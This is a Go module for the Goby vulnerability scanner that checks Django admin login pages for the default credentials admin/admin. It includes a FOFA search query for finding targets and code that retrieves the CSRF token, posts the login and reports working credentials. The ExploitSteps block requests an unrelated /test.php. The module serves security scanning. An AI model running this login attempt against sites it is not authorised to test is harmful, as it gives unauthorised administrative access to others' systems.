package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Django /admin/login/ Default Password Vulnerability",
    "Description": "<p>One of the most powerful features of Django is its automatic admin interface. It reads metadata from your models and provides a quick, model-centric interface that trusted users can use to manage the content on your site. The recommended scope for using the admin interface is limited to internal management tools within an organization. It is not intended to be used as the foundation for your entire frontend.</p>",
    "Product": "Django-Site-Admin",
    "Homepage": "https://www.djangoproject.com/",
    "DisclosureDate": "2024-07-12",
    "PostTime": "2024-07-16",
    "Author": "1538279017@qq.com",
    "FofaQuery": "title=\"Log in | Django site admin\" && body=\"Username:</label>\"",
    "GobyQuery": "title=\"Log in | Django site admin\" && body=\"Username:</label>\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire application platform through this vulnerability.</p>",
    "Recommendation": "<p> change the default password and use a stronger password.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/login/?next=/admin/",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|NULL|variable|默认口令为:admin/admin,请返回admin后台页面登录"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "Django-site-admin /admin/login/ 默认口令漏洞",
            "Product": "Django-site-admin",
            "Description": "<p>Django 最强大的部分之一是自动管理界面。它从你的模型中读取元数据，提供一个快速的、以模型为中心的界面，受信任的用户可以管理你网站上的内容。管理的推荐使用范围仅限于一个组织的内部管理工具。它不打算用于围绕你的整个前端构建。<br></p><p>Django-site-admin&nbsp;/admin/login/?next=/admin/ 存在默认口令漏洞<br></p>",
            "Recommendation": "<p>更改默认密码</p>",
            "Impact": "<p>直接进入后台修改相关权限和查看敏感信息</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Django /admin/login/ Default Password Vulnerability",
            "Product": "Django-Site-Admin",
            "Description": "<p>One of the most powerful features of Django is its automatic admin interface. It reads metadata from your models and provides a quick, model-centric interface that trusted users can use to manage the content on your site. The recommended scope for using the admin interface is limited to internal management tools within an organization. It is not intended to be used as the foundation for your entire frontend.<br></p>",
            "Recommendation": "<p> change the default password and use a stronger password.<br></p>",
            "Impact": "<p>Attackers&nbsp;can&nbsp;control&nbsp;the&nbsp;entire&nbsp;application&nbsp;platform&nbsp;through&nbsp;this&nbsp;vulnerability.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	sendPayloadSkjleriwekrjFF7723 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回

		//post请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlPost)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		//发送get请求
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		path := "/admin/login/?next=/"
		getCsrfToken, err := setGetRequest(hostInfo, path, map[string]string{})
		if err != nil || getCsrfToken.StatusCode != 200 {
			return false, "", ""
		}
		if !strings.Contains(getCsrfToken.Cookie, "csrftoken") || !strings.Contains(getCsrfToken.RawBody, "name=\"csrfmiddlewaretoken\"") {
			return false, "", ""
		}
		csrfmiddlewaretoken := regexp.MustCompile(`name="csrfmiddlewaretoken" value="(.*?)">`).FindStringSubmatch(getCsrfToken.RawBody)[1]

		if csrfmiddlewaretoken == "" {
			return false, "", ""
		}

		path = "/admin/login/?next=/"
		header := map[string]string{
			"Cookie":          getCsrfToken.Cookie,
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo + "/admin/login/?next=/",
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		body := "csrfmiddlewaretoken=" + csrfmiddlewaretoken + "&username=admin&password=admin&next=%2F"
		res, err := setPostRequest(hostInfo, path, body, header)
		if err != nil || res.StatusCode != 302 {
			return false, "", ""
		}

		vulInfo := `admin:admin`
		vulPath := path

		return true, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadSkjleriwekrjFF7723(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadSkjleriwekrjFF7723(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
